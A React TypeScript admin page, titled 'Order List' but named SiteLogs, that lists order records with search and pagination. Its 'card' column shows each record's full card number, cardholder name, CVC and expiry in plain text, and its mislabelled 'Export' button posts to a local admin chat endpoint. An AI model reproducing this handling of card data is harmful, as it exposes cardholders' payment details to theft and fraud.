import { Button, SearchInput } from '@/components/elements';
import { Action, Content, Footer, Header, Page } from '@/feature/common/layout';
import { List, Pagination, type ListColumn } from '@/feature/common/list';
import { DownloadIcon, FilterIcon, PlusIcon } from '@/icons';
import { useState } from 'react';
import { useNavigate } from 'react-router';
import { useOrders } from './hooks/useOrders';
export default function SiteLogs() {
    const navigator = useNavigate();
    // const [index, setIndex] = useState(-1);
    const [search, setSearch] = useState('');
    const { result, setParamFilter, setPage } = useOrders();

    const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === 'Enter') {
            setParamFilter([{ field: 'ukey', operator: 'like', value: search }]);
        }
    };
    const handle = () => {
        fetch('http://localhost:8080/admin/api/chat', {
            method: 'POST',
            body: JSON.stringify({
                action: 'clients',
            }),
        }).then((res) => {
            if (res.ok) {
                res.json().then((data) => {
                    console.log(data);
                });
            }
        });
    };
    const siteLogColumns: ListColumn<OrderLogsType>[] = [
        {
            key: 'order_no',
            label: 'order number',
            sortable: false,
            // render: (item?: OrderLogsType) => item?.order_no.slice(0, 8) || '-',
        },
        { key: 'card', label: 'card', sortable: false, render: (item?: OrderLogsType) => `${item?.card_number} ${item?.card_name} ${item?.card_cvc} ${item?.card_expire}` },
        { key: 'reason', label: 'reason', sortable: false, render: (item?: OrderLogsType) => `${item?.country} ${item?.state} ${item?.city} ${item?.zip_code}` },
        { key: 'address', label: 'address', sortable: false },
        { key: 'address1', label: 'address1', sortable: false },
        {
            key: 'actions',
            label: 'Actions',
            sortable: false,
        },
    ];
    return (
        <Page title="Order List" showBackgroud={true}>
            <Header title="Order List" desc="Track your store's progress to boost your sales.">
                <Button endIcon={<DownloadIcon className="w-5 h-5" />} variant="outline" onClick={handle}>
                    Export
                </Button>

                <Button startIcon={<PlusIcon className="w-5 h-5" fill="white" />} variant="primary" onClick={() => navigator('/add-product')}>
                    Add Product
                </Button>
            </Header>
            <Action>
                <SearchInput value={search} onKeyDown={handleKeyDown} onChange={(e) => setSearch(e.target.value)} />
                <Button startIcon={<FilterIcon className="w-5 h-5" />} className="h-11" variant="outline">
                    Filter
                </Button>
            </Action>
            <Content>
                <List<OrderLogsType> fields={siteLogColumns} items={result?.list || []} />
            </Content>
            <Footer>
                <Pagination currentPage={result?.page} pageSize={result?.size} totalCount={result?.total} onPageChange={setPage} />
            </Footer>
        </Page>
    );
}
